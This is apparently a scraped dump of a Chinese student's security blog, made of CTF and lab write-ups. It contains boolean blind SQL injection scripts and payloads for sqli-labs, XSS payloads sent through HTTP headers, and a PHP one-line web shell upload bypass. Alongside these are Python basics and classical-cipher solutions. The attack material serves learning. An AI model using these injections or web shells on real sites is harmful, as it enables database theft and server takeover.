修改一下脚本123456789101112131415161718import requestsdef table_name(): name = '' for j in range(1,9): for i in 'sqcwertyuioplkjhgfdazxvbnm': url = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1)))=ord('%s')\" %(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'You are in' in r.text: name = name+i print(name) break print('table_name:',name)table_name() 通过修改 limit 0,1 来获取其他表名爆出列名payload：1?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))&gt;100 --+ 修改脚本，跑出列名123456789101112131415161718import requestsdef column_name(): name = '' for j in range(1,9): for i in 'sqcwertyuioplkjhgfdazxvbnm': url = \"http://127.0.0.1/sqli-labs-master/Less-8/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),%d,1)))=ord('%s')\" %(j,i) # print(url+'%23') r = requests.get(url+'%23') if 'You are in' in r.text: name = name+i print(name) break print('column_name:',name)column_name() 其他的修改limit后的值即可得出其他的列名 爆值1?id=1' and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+ 脚本还和上面的相同，只不过改下payload，但是这个脚本是有缺陷的，就是在遍历，但是我们赋给i的字符只有小写的，有可能其他大写的或特殊符号显示不出来，只要加上就行了。但是这样做的话脚本跑的也会很慢，还是好好学习python，写一个更加便捷的。 最后总结一下布尔盲注常用语句 爆数据库长度1?id=1' and (length(database()))&gt;1 --+ 爆数据库名1?id=1' and (ascii(substr(database(),1,1)))&gt;1 --+ 爆表名1?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;1 --+ 爆列名1?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)))&gt;1 --+ 爆值1?id=1' and (ascii(substr(( select password from users limit 0,1),1,1)))&gt;1--+ 语句几乎不变，根据需要加以改动即可，这次就先学习布尔盲注，接下来学习时间盲注。","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://bealright.github.io/tags/SQL注入/"}]},{"title":"python学习（操作列表、if语句）","slug":"python学习（操作列表、if语句）","date":"2019-07-22T11:22:21.000Z","updated":"2019-07-24T00:53:19.740Z","comments":true,"path":"2019/07/22/python学习（操作列表、if语句）/","link":"","permalink":"http://bealright.github.io/2019/07/22/python学习（操作列表、if语句）/","excerpt":"","text":"前言：继续学习python，接下来学习操作列表等知识 第四章、操作列表12345678messages=['a','b','c','d']for message in messages: print(message)#输出结果：abcd 格式：for xxx in xxxx : 利用for循环，遍历整个列表。使用单数和复数式名称，可帮助判断代码段处理的是单个列表元素还是整个列表 也可以在for循环中执行更多的操作，例如：12345678messages=['a','b','c','d']for message in messages: print(message.title() + \"we you he\")#输出结果：Awe you heBwe you heCwe you heDwe you he 在python中，for循环没有花括号，区分是否为for循环的语句就是通过缩进来区分。在for循环下没有缩进的只执行一次。 12345678910111213141516171819messages=['a','b','c','d']for message in messages: print(message.title()+\"we\") print(\"you\"+message.title()+\".\\n\")print(\"he!\") #输出结果：AweyouA.BweyouB.CweyouC.DweyouD.he! 创建数值列表 使用函数range()能够轻松地生成一系列的数字 12345678for value in range(1,5): print(value)#输出结果：1234函数range()从你指定的第一个值开始数，并在到达你指定的第二个值 后停止，因此输出不包含第二个值 使用range()函数和list()函数创建数字列表，将range() 作为list() 的参数，输出将为一个数字列表。 1234numbers=list(range(1,6))print(numbers)#输出结果：[1, 2, 3, 4, 5] 使用 range()函数还可以指定步长 12345#求1-10的偶数numbers=list(range(2,11,2))print(numbers)#输出结果：[2, 4, 6, 8, 10] 实现创建一个列表，其中包含前10个整数（即1~10）的平方 1234567891011121314squares = []for value in range(1,11): square = value**2 squares.append(square) print(squares)输出结果：[1, 4, 9, 16, 25, 36, 49, 64, 81, 100]#为使代码更为简介，还可以不使用临时变量squares = []for value in range(1,11): squares.append(value**2) print(squares) 对数字列表执行简单的统计计算 对数字列表执行简单的统计计算，min(),max(),sum() 12345678numbers = [1,2,3,4,5,6,7,8,9]print(min(numbers))print(max(numbers))print(sum(numbers))#输出结果：1945 列表解析 列表解析 将for 循环和创建新元素的代码合并成一行，并自动 附加新元素。 1234squares = [value**2 for value in range(1,11)]print(squares)#输出结果：[1, 4, 9, 16, 25, 36, 49, 64, 81, 100] 使用列表的一部分切片(可以处理列表的部分元素) 创建切片，可指定要使用的第一个元素和最后一个元素的索引。与函数range() 一样。 1234players = ['a','d','c','d']print(players[0:3])#输出结果：['a', 'd', 'c'] 没有指定第一个索引，将从列表开头开始 123456789101112131415players = ['a','d','c','d']print(players[:4])#输出结果：['a', 'd', 'c', 'd']#要让切片终止于列表末尾，也可使用类似的语法。例如：players = ['a','d','c','d']print(players[2:])#输出结果：['c', 'd']#负数索引返回离列表末尾相应距离的元素players = ['a','d','c','d']print(players[-3:])#输出结果：['d', 'c', 'd'] 遍历切片1234567players = ['a','d','c','d']for player in players[:3]: print(player.title())#输出结果：ADC 复制列表 要复制列表，可创建一个包含整个列表的切片，方法是同时省略起始索引和终止索引（[:] ） 12345678910my = ['a','b','c','d']you = my[:]print(my)print(\"\\n\")print(you)#输出结果：['a', 'b', 'c', 'd']['a', 'b', 'c', 'd'] 元组 定义元组后，可以使用索引来访问其元素，就像访问列表元素一样。而且是用圆括号括起来的 修改元组的操作是被禁止的，不能给元组的元素赋值.例如：12345my=(200,50)my[0]=210print(my[0])#输出结果：TypeError: 'tuple' object does not support item assignment 遍历元组中的所有值 与列表一样，也可以使用for 循环来遍历元组中的所有值 123456mys=(200,50)for my in mys: print(my)#输出结果：20050 修改元组变量 不能修改元组的元素，但可以给存储元组的变量赋值1234567891011121314mys = (200,50)for my in mys: print(my)print(\"\\n\")mys = (210,60)for my in mys: print(my)#输出结果：2005021060 如果需要存储的一组值在程序的整个生命周期内都不变，可使用元组. 第五章、if语句123456789101112mys = ['a','b','c','d']for my in mys: if my == 'a': print(my.title()) else: print(my)#输出结果：Abcd 条件测试 每条if 语句的核心都是一个值为True 或False 的表达式，这种表达式被称为条件测试 条件测试 。 == 相等运算符!=判断两个值是否不等 检查特定值是否包含在列表中 判断特定的值是否已包含在列表中，可使用关键字in 1234&gt;&gt;&gt; mys = ['a','b','c']&gt;&gt;&gt; 'a' in mysTrue 检查特定值是否不包含在列表中 使用关键字not in 1234567mys = ['a','b','d','f']you = 'l'if you not in mys: print(\"no\")#输出结果： no if-elif-else结构12345678910age = 12if age &lt; 4: print(\"a\")elif age &lt; 18: print(\"b\")else: print(\"c\")#输出结果：b 使用多个elif结构12345678910111213age=12if age&lt;4: price = 0elif age &lt;18: price = 5elif age &lt;40: price = 10else: price = 5print(price)#输出结果：5 确定列表不是空的12345678910messages=[]if messages: for message in messages: print(message + \".\") print(\"yes\")else: print(\"no\")#输出结果：no 使用多个列表1234567891011121314people_message = ['a','b','c','d']messages = ['a','b']for message in messages: if message in people_message: print(\"yes\") else: print(\"no\")print(\"over\")#输出结果：yesyesover 这次就先学习到这里，下次继续往后学习。","categories":[{"name":"编程语言学习","slug":"编程语言学习","permalink":"http://bealright.github.io/categories/编程语言学习/"}],"tags":[{"name":"python","slug":"python","permalink":"http://bealright.github.io/tags/python/"}]},{"title":"XSS学习-XSS挑战之旅(二)","slug":"XSS学习-XSS挑战之旅(二)","date":"2019-07-19T12:20:32.000Z","updated":"2019-07-24T00:52:00.114Z","comments":true,"path":"2019/07/19/XSS学习-XSS挑战之旅(二)/","link":"","permalink":"http://bealright.github.io/2019/07/19/XSS学习-XSS挑战之旅(二)/","excerpt":"","text":"前言：之前打XSS平台时，打到了第11关就没有继续了，现在有空了就继续打咯，再增加点关于XSS的知识。 第十一关这关坑我好长时间，看了好多博客直接给说修改Referer，给截图中都有自带的Referer值，修改就行，但是我怎么抓都抓不到Referer值。还以为自己设置有问题，去查burp各种的设置。。。 终于看了一篇很细的大佬博客，才算搞懂，Referer值是自己加上的，这里就详细的介绍一下这关，别让和我一样的小白继续跌坑。 我们从第十关来到第十一关（不要直接跳到第十一关，否则看不出任何线索）进入第十一关后看源码发现t_ref字段中，value的值是http referer的值，所以这关应该考的就是http头部的xss注入，那只要在Referer值中注入xss,也会出现在value值中，就会注入成功。 构造Referer（手动构造的，不是一抓包就有的）注入成功forward发包再关闭即可 这里的Referer值是自己构造的，有的大佬一抓包就有，我的怎么抓也没有，这点困扰我很长时间,但其实不论是本地还是在线网站我都抓不到Referer原来的值，这里应该就是抓不到原来的Referer，也可能是我没修改好的问题吧。附上payload:123Referer: \" onmouseover=alert(/xss/) type=\"text\"#onmouseover 事件属性#当鼠标指针移动到图像上时执行一段 JavaScript 第十二关查看源码，发现t_ref字段中，value的值是User-Agent的值，所以和第十一题一样了，我们就抓包修改User-Agent即可。接下来的流程就和第十一关相同了，这里就不阐述了附上payload: 1User-Agent: \" onmouseover=alert(/xss/) type=\"text\" 第十三关查看源代码抓包发现和cookie的值相同那原理和第十关和第十一关就相同了，直接构造playload即可附上payload: 1Cookie: user=\" onmouseover=alert(/xss/) type=\"text\" 第十四关这关需要结合漏洞，直接看先知上的wp了解一下exif xssXSS挑战之旅—游戏通关攻略 第十五关查看源码发现两处不认识的东西，百度查寻同时也发现ng-include是AngularJS的一个指令那注入点应该就在ng-include这里了，先知博客上用的包含第一关的php文件，然后用标签&lt;img&gt;进行xss. 附上payload：1?src='level1.php?name=test&lt;img src=1 onerror=alert(/hacker/)&gt;' 第十六关还按照之前的套路，先试一些常见的payload，看看都过滤了什么输入 1http://test.xss.tv/level16.php?keyword=&lt;script&gt;alert(/xss/)&lt;/script&gt; 发现过滤了script，\\,还有空格这里利用%0d、%0a（回车换行）实现xss攻击绕过,代替空格即可附上payload：12?keyword=&lt;img%0dsrc=1%0donerror=alert(/xss/)&gt;?keyword=&lt;img%0asrc=1%0aonerror=alert(/xss/)&gt; 第十七关先输入最常见的，看下情况 1?arg01=a&amp;arg02=&lt;script&gt;alert(/xss/)&lt;/script&gt; 发现这里是输出点，过滤了&lt;&gt;换onclick事件尝试，发现&quot;被过滤那就用on事件，反正就是各种尝试，结果确实on事件能过payload：123?arg01=a&amp;arg02= onmouseover=alert(/xss/)#onmouseover 事件属性当鼠标指针移动到图像上时执行一段 JavaScript： 第十八关刚进去发现这和第十七关挺像的试试刚才的payload….一模一样payload： 1?arg01=a&amp;arg02= onmouseover=alert(/xss/) 这次就先学习到这，后面的涉及Flash，待有空再研究。另附上大佬博客XSS挑战之旅—游戏通关攻略XSS练习小游戏","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"http://bealright.github.io/tags/XSS/"}]},{"title":"实验吧— Crypto Write up(一)","slug":"实验吧— Crypto Write up(一)","date":"2019-07-18T11:22:21.000Z","updated":"2019-07-21T14:41:46.484Z","comments":true,"path":"2019/07/18/实验吧— Crypto Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/07/18/实验吧— Crypto Write up(一)/","excerpt":"","text":"前言：最近先做一些关于古典密码的题，了解常见的古典密码。 变异凯撒1加密密文：afZ_r9VYfScOeO_UL^RWUc 刚开始以为这道题考的是凯撒加密，就在线求解，结果不行，那就来分析题目，变异凯撒，应该是利用凯撒加密的原理加以变形，观察一波，提示又提示说格式为flag{}，发现a的ascii到f的ascii偏移量为5，f的ascii到l的ascii偏移量为6,Z的ascii到a的ascii偏移量为7，总结出以后的每个字母偏移量都要加1，观察出规律了，就写脚本跑吧。 附上ASCII表py3脚本123456789101112a = 'afZ_r9VYfScOeO_UL^RWUc'b = ''i = 5for d in a: b+=chr(ord(d)+i) i+=1print(b)#ord()取出一个字符变成ASCII#输出结果：flag&#123;Caesar_variation&#125; 做题小结：凯撒加密是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。有时候需要自己区观察规律，不能死板一味利用在线工具，要多按照题意写出相应的脚本。 围在栅栏中的爱 最近一直在好奇一个问题，QWE到底等不等于ABC？-.- .. –.- .-.. .– - ..-. -.-. –.- –. -. … — —flag格式：CTF{xxx} 首先就摩斯密码解密，解出明文字符为：1KIQLWTFCQGNSOO 再来看提示：QWE到底等不等于ABC？想起来QWE密码，利用QWE密码进行求解，但是求解结果不对，应该是漏掉了一些内容，观察题目发现围在栅栏中的爱，应该还要涉及到栅栏解密，试试看先试试以两字为一栏的，进行QWE解密，解出1rabnayihsevoli 再结合刚才题目中说到爱，观察到解出来的字符后面有love这个词，不过是倒叙的，那就反过来看看。提交即为flag 做题小结：通过这道题了解了QWE加密，键盘按ABC的顺序排列得到对应的字母。附上大佬博客QWE加密 疑惑的汉字 王夫 井工 夫口 由中人 井中 夫夫 由中大 当铺密码在线解密写一个简单脚本跑一下1234567a = [67,84,70,123,82,77,125]b=''for i in a: b=b+chr(i)print(b) 得出flag1CTF&#123;RM&#125; 做题小结：题很简单，主要是为了了解当铺密码，当前汉字有多少笔画出头，就是转化成数字几，按照这个规则即可解出当铺密码。 古典密码 密文内容如下{79 67 85 123 67 70 84 69 76 88 79 85 89 68 69 67 84 78 71 65 72 79 72 82 78 70 73 69 78 77 125 73 79 84 65}请对其进行解密提示：1.加解密方法就在谜面中 2.利用key值的固定结构格式：CTF{ } 先对密文求解，密文为ASCII转成字符123456789a = [79,67,85,123,67,70,84,69,76,88,79,85,89,68,69,67,84,78,71,65,72,79,72,82,78,70,73,69,78,77,125,73,79,84,65]b=''for i in a: b=b+chr(i)print(b)#输出结果：OCU&#123;CFTELXOUYDECTNGAHOHRNFIENM&#125;IOTA 用凯撒和栅栏尝试都不行，去看提示，提示说加解密方法就在谜面中，。。。什么也没看出来，再去看题目，发现是古典密码而古典密码编码方法归根结底主要有两种，即置换和代换。置换密码中包含列置换和周期置换，在百度看到一篇大佬的博客后，感觉这个题应该就是列置换，试试吧。 在此之前，先来了解一下列置换的原理，这里还是参考大佬的博客吧，自己表达不出来这个原理。 置换密码之列置换 首先这个密文一共有35个字符，可以分为7*5和5*7的矩阵就先以7*5来尝试123456 12345671 OCU&#123;CFT2 ELXOUYD3 ECTNGAH 4 OHRNFIE5 NM&#125;IOTA 联系第二个提示，key值的固定结构即为CTF{},这个信息给我们提高很大的便利，这样就可以确定一些列的位置。 开始肯定是C，然后是T，再来就F和{，最后便是} 所以就有两种情况，因为题中第一行有两个C顺序即为这两种 2764xx3或5764xx3 先试第一种，当然第一种也有两种情况，分别为 12764513或2764153 先试第一种1234567CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125;即为CTF&#123;COULDYOUEXCHANGETHEINFORMATION&#125; 提交，对了。。。运气好，否则得试好几次。 我喜欢培根 – — .-. … . ..–.- .. … ..–.- -.-. — — .-.. ..–.- -… ..- - ..–.- -… .- -.-. — -. ..–.- .. … ..–.- -.-. — — .-.. . .-. ..–.- -.. -.-. -.-. -.. -.-. -.-. -.-. -.. -.. -.. -.-. -.. -.-. -.-. -.-. -.. -.. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.-. -.. -.. -.-. -.. -.-. -.-. -.-. -.-. -.. -.-. -.-. -.-. -.-. -.-. / -.-. -.. -.-. -.-. -.-. -.. -.-. -.-. -.. -.-. / -.-. -.-. -.-. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.. -.. -.-. -.-. -.. -.-. -.. -.. 摩斯密码解密1MORSE_IS_COOL_BUT_BACON_IS_COOLER_DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD 摩斯是酷的但培根更酷，利用培根解密这里需要注意一点就是这里按照密文字母顺序替换成AB，因为培根密码中只有A和B.原理详解：1DCCDCCCDDDCDCCCDDCCCCCCCCCDDCDCCCCDCCCCCCDCCCDCCDCCCCDCCDDDCCDDDCCDCDD 将C替换成A,D替换成B，在线网站解密即可得出flag。 做题小结：重新熟悉一下培根密码。 Fair-Play The quick brown fox jumps over the lazy dog! ihxo{smzdodcikmodcismzd} 刚开始接触这道题根本没有一点思路，无奈只有百度，发现这是古典密码中的Playfair 加密算法，那么就来了解一下。 Playfair算法基于一个5*5的字母矩阵，该矩阵使用一个关键词构造，方法是按从左到右、从上到下顺序，填入关键词的字母(去除重复字母)后，将字母表其作余字母填入。 加密规则 Playfair加密算法是先将明文按两个字母一组进行分组，然后在矩阵中找对应的密文。 以这道题为例，来了解一下加密规则首先编制密码表题中给我们的密匙为The quick brown fox jumps over the lazy dog!密文为ihxo{smzdodcikmodcismzd}先根据密匙来编织出密码表(我这里是按照从左到右)12345t h e q ui c k b ro w n f xm p s v la z y d g 取密文的规则如下： 若明文出现相同字母在一组，则在重复的明文字母中插入一个填充字母(eg:z)进行分隔后重新分组(eg: balloon被重新分组为ba lz lo on) 若分组到最后一组时只有一个字母，则补充字母z 若明文字母在矩阵中同行，则循环取其右边下一个字母为密文(矩阵最右边的下一个是最左边的第一个)(eg: br被加密为ri) 若明文字母在矩阵中同列，则循环取其下边下一个字母为密文(矩阵最下边的下一个是最上边的第一个)(eg: pz被加密为zh) 若明文字母在矩阵中不同行不同列，则取其同行且与同组另一字母同列的字母为密文(eg: mz被加密为pa，fg被加密为xd) 这就是加密方式，如果懂得了加密，那么反过来推出明文即可 做题小结：一开始会很头疼不懂原理，把原理搞懂便很好做的，又了解了一种新的古典密码，继续学习吧！另附上大佬博客python之playfair密码算法详解[原创]向大佬学习。","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://bealright.github.io/categories/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"I春秋——web Write up(一)","slug":"I春秋——web Write up(一)","date":"2019-07-17T11:38:24.000Z","updated":"2019-07-19T16:21:19.506Z","comments":true,"path":"2019/07/17/I春秋——web Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/07/17/I春秋——web Write up(一)/","excerpt":"","text":"前言：总结一下最近做的web题，从题中可以学习到很多知识。 爆破-1 123456789&lt;?phpinclude \"flag.php\";$a = @$_REQUEST['hello'];if(!preg_match('/^\\w*$/',$a ))&#123; die('ERROR');&#125;eval(\"var_dump($$a);\");show_source(__FILE__);?&gt; 给了一段PHP代码，里面还有简单的正则表达式，那就来分析一下。 /表示的是正则表达式的开始和结束，^或\\A 匹配字符串开始位置，\\w匹配任意数字或字母或下划线(a-z,A-Z,0-9,_)，*匹配0次、或1次、或多次其前面的字符(相当于可以输入多个字符、数字、或下划线)，$或者\\Z匹配字符串的结束位置。所以在这里我们输入hello可以执行 提示有说flag在某个变量中，还观察到var_dump($$a)，可以使用超全局变量$GLOBALS，直接在url中构造?hello=GLOBALS即可flag。 做题小结：这道题之所以能够用超全局变量，就是因为输出时又多了一个$,利用它构造一系列超全局变量,得出我们想要的信息。1234$_SERVER 这种超全局变量保存关于报头、路径和脚本位置的信息$_REQUEST 用于收集 HTML 表单提交的数据$_POST 广泛用于收集提交 method=\"post\" 的 HTML 表单后的表单数据。$_GET 也可用于收集提交 HTML 表单 (method=\"get\") 之后的表单数据 爆破-2 12345&lt;?phpinclude \"flag.php\";$a = @$_REQUEST['hello'];eval( \"var_dump($a);\");show_source(__FILE__); 提示说flag不在变量中，用$GLOBALS查看果然不在。不在变量中，那就查flag.php文件，查到一个file_get_contents() 函数可以把整个文件读入一个字符串中。1/?hello=file_get_contents('flag.php') 除此之外，我们还可以用另一个函数file()函数。1?hello=file('flag.php') 即可得出flag还可以1?hello=readfile('flag.php') 做题小结:通过上面三种方法，利用三种不同的函数，都可以得出flag，下面就区分一下他们之间的区别。123file() 函数是把整个文件读入一个数组中，然后将文件作为一个数组返回。readfile() 函数读取一个文件，并写入到输出缓冲。如果成功，该函数返回从文件中读入的字节数。如果失败，该函数返回 FALSE 并附带错误信息。您可以通过在函数名前面添加一个 '@' 来隐藏错误输出。file_get_contents() 把整个文件读入一个字符串中。 爆破-3给了一串php代码，分析一下 1234567891011121314151617181920212223242526&lt;?php error_reporting(0); //关闭错误报告session_start(); //开启sessionrequire('./flag.php'); //引入flag文件if(!isset($_SESSION['nums']))&#123; $_SESSION['nums'] = 0; $_SESSION['time'] = time();//time() 函数返回自 Unix 纪元（January 1 1970 00:00:00 GMT）起的当前时间的秒数。 $_SESSION['whoami'] = 'ea';&#125;if($_SESSION['time']+120&lt;time())&#123; session_destroy();//session_destroy() 将重置 session，您将失去所有已存储的 session 数据&#125;$value = $_REQUEST['value'];//$_REQUEST 用于收集 HTML 表单提交的数据$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];//mt_rand() 使用 Mersenne Twister 算法返回随机整数if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;//a . b 并置 连接两个字符串 \"Hi\" . \"Ha\" HiHa $_SESSION['nums']++;//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 $_SESSION['whoami'] = $str_rands;//substr(string,start,length) echo $str_rands;&#125;if($_SESSION['nums']&gt;=10)&#123; echo $flag;&#125;show_source(__FILE__);?&gt; 前两个if语句简单，重要的是如下语句123$value = $_REQUEST['value'];$str_rand = range('a', 'z');$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]; $str_rand会从a到z中随机取一个字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]会拼凑成两个字母赋值给$str_rands。然后就来观察以下代码123456789if($_SESSION['whoami']==($value[0].$value[1]) &amp;&amp; substr(md5($value),5,4)==0)&#123;//a . b 并置 连接两个字符串 \"Hi\" . \"Ha\" HiHa $_SESSION['nums']++;//substr() 函数返回字符串的一部分。//如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。 $_SESSION['whoami'] = $str_rands;//substr(string,start,length) echo $str_rands;&#125;if($_SESSION['nums']&gt;=10)&#123; echo $flag;&#125; 很明了了，因为$_SESSION[&#39;nums&#39;] = 0，我们只需将上面的if语句循环十次（即$_SESSION[&#39;nums&#39;]++循环十次），即可得出flag。 接下来就来构造语句，一开始的$_SESSION[&#39;whoami&#39;] = ‘ea’，因此就构造1?value[0]=e&amp;value[1]=a 又因为每执行一次，$_SESSION[&#39;whoami&#39;]会变化而且值与$str_rands相同，并且每执行一次都会输出$str_rands的值，因此只要按照这个顺序输入十次即可得出flag。当然可以也可以写一个脚本来做这道题，但是我们还漏掉了一个很重要的细节就是substr(md5($value),5,4)==0，这个有什么作用那？可以写一个简单的脚本来测试一下看看以数组的形式传入所以刚才只要用数组进行传参就没有问题。 当然我们分析一下就可以知道这个条件在数组的情况下永远为真，因为在数组的情况下是不能MD5加密的，所以肯定==0. 也可以写一个脚本来跑出flag，恰好最近在学python，参考大佬自己也模仿写一下123456789import requestsurl='http://8e7202f5492447d5ab76eb8b7e8b4b27838e55901eba4c5f.changame.ichunqiu.com'# 创建一个session对象 session=requests.Session()# 发送请求html=session.get(url+'?value[]=ea').textfor i in range(10): html=session.get(url+'?value[]='+ html[0:2]).textprint(html) 得到flag 做题小结：web题有很多解法，但最基础的是一定要会写脚本，得加快进度学习python了python中requests.session的妙用python学习之-requests模块基础requests session的作用 Upload看到文件上传，就想起来用一句话木马＋菜刀，那就来先构造一句话木马。上传显示上传成功，我们来查看一下上传之后的php文件把&lt;?php给过滤了，那换一种方法，在大佬的博客上发现绕过&lt;?限制的一句话 1&lt;script language=\"php\"&gt;@eval_r($_POST[pass])&lt;/script&gt; 拿来试试发现php被过滤掉了，那就将php改为大写PHP试试没有显示，说明已经传进去了，菜刀连接通过源代码可以知道上传路径，连接即可得出flag。 做题小结：和XSS一样，一句话木马也有很多绕过姿势，有空一定要总结一下一句话各种绕过姿势，最后附上大佬博客。PHP一句话木马后门一句话木马的套路 那些强悍的PHP一句话后门","categories":[{"name":"web","slug":"web","permalink":"http://bealright.github.io/categories/web/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"2019安恒七月月赛——MISC","slug":"2019安恒七月月赛——MISC","date":"2019-07-16T11:38:24.000Z","updated":"2019-07-19T10:35:10.755Z","comments":true,"path":"2019/07/16/2019安恒七月月赛——MISC/","link":"","permalink":"http://bealright.github.io/2019/07/16/2019安恒七月月赛——MISC/","excerpt":"","text":"前言：作为一个小白，感觉安恒的题是真的难，但也要努力复现出来，也可以多学很多东西。 真正的CTFer一张图片，还是之前的老思路，winehx查看，binwalk分离等等，但是都没有线索，再仔细观察图片，发现应该是高度被修改了，下面应该还隐藏有图片查看一下被修改过后的高度这里也不知道图片原高度为多少，就往大的方向整我这里直接将05改为了0C,结果过大了下方有空白，改成0A没有空白了，然后再观察图片，ctrl+左键放大图片得出flag，但这没有结束，大师傅告诉我这道题涉及png中CRC检验错误问题，让我拖进Stegsolve就知道有什么问题了，按照大师傅的说法去做，果然打不开百度查找，发现了一篇大佬的博客这也就是为何提示说png数据有问题的原因了，需要写一个爆破高度的脚本来得出原图的高度，才可以在Stegsolve中打开。这里搬运大师傅的脚本，目前自己写不出来，只会修改参数。 123456789101112131415# -*- coding: utf-8 -*-import binasciiimport struct#\\x49\\x48\\x44\\x52\\x00\\x00\\x01\\xF4\\x00\\x00\\x01\\xA4\\x08\\x06\\x00\\x00\\x00crc32key = 0x6F03AD71for i in range(0, 65535): height = struct.pack('&gt;i', i) #CRC: CBD6DF8A data = '\\x49\\x48\\x44\\x52\\x00\\x00\\x05\\x1C' + height + '\\x08\\x06\\x00\\x00\\x00' crc32result = binascii.crc32(data) &amp; 0xffffffff # print crc32result if crc32result == crc32key: print ''.join(map(lambda c: \"%02X\" % ord(c), height)) 因为我的环境是py3，而大师傅的脚本是py2，直接在线运行即可爆出了原图高度，进行修改,Stegsolve打开，即可看出flag 做题感悟：以前做修改宽高的MISC题中，没有想到过这种CRC检验错误的问题，这次做题是真的涨知识。另附上大佬的博客[CTF隐写]png中CRC检验错误的分析 解不开的秘密一个加密的word文档，一个十六进制的文件，先从文件入手，HEX-&gt;ASCII发现是base64，解密 这是啥。。。，完全没思路，不过还是注意到RealVNC,百度查查，REAL VNC是一款远程控制工具软件。观察到文件中有Password，如果猜的不错，这个密码破解后应该就是word的密码了。VNC密码破解详解果然找到了，思路清晰了，只要我们把这个给破解了就可以得出密码了因为上面博客中的工具实在找不到，就换一种新工具vncpwd找到对应目录，输入命令即可得出密码打开word回车的标志，把图片拖下去这里面肯定隐藏有flag，打开word的隐藏文字，但是不行，那就直接复制出来看看即可得出flag 做题感悟：这道题其实不难，但如果没有耐心就看到那个文件就不想继续下去了，果然是涉及各种各样的加密解密，这次又了解了VNC，通过做这两道题，收获很大，继续努力","categories":[{"name":"MISC","slug":"MISC","permalink":"http://bealright.github.io/categories/MISC/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://bealright.github.io/tags/CTF/"}]},{"title":"I春秋—— Crypto Write up(一)","slug":"I春秋—— Crypto Write up(一)","date":"2019-07-14T12:34:24.000Z","updated":"2019-07-19T16:20:38.143Z","comments":true,"path":"2019/07/14/I春秋—— Crypto Write up(一)/","link":"","permalink":"http://bealright.github.io/2019/07/14/I春秋—— Crypto Write up(一)/","excerpt":"","text":"前言：密码学涉及一系列的加密算法，虽然自己数学贼烂，但觉得加密这些算法还是蛮好玩的，就通过题来了解一些算法，话不多说，开始做题。 Substituted方法：百度翻译题目一下，Substituted（替换），替换加密中包含有简单替换密码，应该就是简单替换密码，在线网站求解一波。替换密码解密把头部改成iceCTF即可得出flag。 做题总结：通过这道题来了解一下简单替换密码 替换密码属于简单对称加密，即将字母表中一个字符替换成另一个字符，很好理解。1234567例如： 明文 ABDDD 替换规则： A-&gt;C B-&gt;T D-&gt;F 密文 CTFFF 而攻击方式也有很多种一、暴力破解二、字母频率分析因为替换密码只不过是从一个字符换成另一个字符，我们只要将出现在密文的所有字符出现的频率统计一下，看频率最高的。由此我们可以推断出，频率高的肯定是英文语言中最常用的一个字母的替换字母。密文中字母的频率分布与给定语言有着紧密的联系，即使在相对较短的密文中也成立。 参考大佬的博客进行学习关于替换密码详解 Alien Message一张外星语言图片方法：谷歌识图，查到对应的表，手动对照即可，但是flag格式有毒，大小写格式问题做题总结： 一开始拿到这个题，以为是图片会隐藏信息，用做杂项的方法尝试了但都没用，最后又学到了一招，百度识图或谷歌识图，有时也可以解决问题，也算了解了一种新的做题方法。 回旋13踢方法：根据题目和提供的格式推断出是ROT13(回旋13)，在线解密即可得出flag在线解密 做题总结：一开始真的是一脸懵，完全没有思路，只能查百度谷歌，查到了ROT13编码，所以就通过这个题来了解一下ROT13加密。 ROT13（回转13位）编码是凯撒加密的一种变体，只对字母进行编码（对数字、空格等无影响），用当前字母往前数的第13个字母替换当前字母即可例如：A-&gt;N,B-&gt;O,C-&gt;P等 除此之外，还有ROT5,ROT47 ROT5只对数字有效，用当前数字往前数的第5个数字替换当前数字即可。 ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如：当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_ ，用于ROT47编码的字符其ASCII值范围是33－126。 接下来了解一下非对称加密和对称加密 ①：非对称加密，即加密和解密不是使用同一套规则，之前的对称加密解密中，使用的都是同一个密匙，如果在传输中被拦截，破解的几率会很高。②：非对称加密，加密和解密使用的不是同一个密匙，明文A通过公钥B加密，加密后的明文和公钥一起传输，接收方接收密文后用私钥C(只有接收者才有)解密，这样的加密解密的方式非常安全，即使公钥和密文在传输过程中被拦截了，拦截者没有私钥，就算拿着公钥和密文也无法破解出明文。因此相较于对称加密，非对称加密会更加安全。 